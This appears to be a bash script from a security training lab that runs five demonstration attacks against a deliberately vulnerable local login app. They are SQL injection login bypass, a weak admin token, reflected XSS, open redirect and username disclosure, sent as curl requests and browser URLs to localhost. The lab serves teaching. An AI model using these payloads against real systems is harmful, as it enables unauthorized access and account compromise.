#!/bin/bash

# Vulnerable Login Lab - Attack Guide

echo "==================================="
echo "🔓 VULNERABLE LOGIN LAB ATTACKS"
echo "==================================="
echo ""

# Attack 1: SQL Injection via Login
echo "📍 ATTACK #1: SQL Injection"
echo "Payload: admin' OR '1'='1"
echo ""
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''OR'\''1'\''='\''1","password":"anything"}' | jq .
echo ""
echo ""

# Attack 2: Weak Token Access
echo "📍 ATTACK #2: Weak Token Validation"
echo "Using token with 'admin' substring..."
echo ""
curl -H "Authorization: Bearer admin_token_12345" http://localhost:3000/api/admin | jq .
echo ""
echo ""

# Attack 3: Reflected XSS
echo "📍 ATTACK #3: Reflected XSS"
echo "Visit in browser: http://localhost:3000/search?q=<img%20src=x%20onerror=\"alert('XSS')\">>"
echo ""

# Attack 4: Open Redirect
echo "📍 ATTACK #4: Open Redirect"
echo "Visit in browser: http://localhost:3000/redirect?url=https://google.com"
echo ""

# Attack 5: Information Disclosure
echo "📍 ATTACK #5: Information Disclosure"
echo "Testing with known username..."
echo ""
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}' | jq .
echo ""

echo "==================================="
echo "✓ All attacks demonstrated!"
echo "==================================="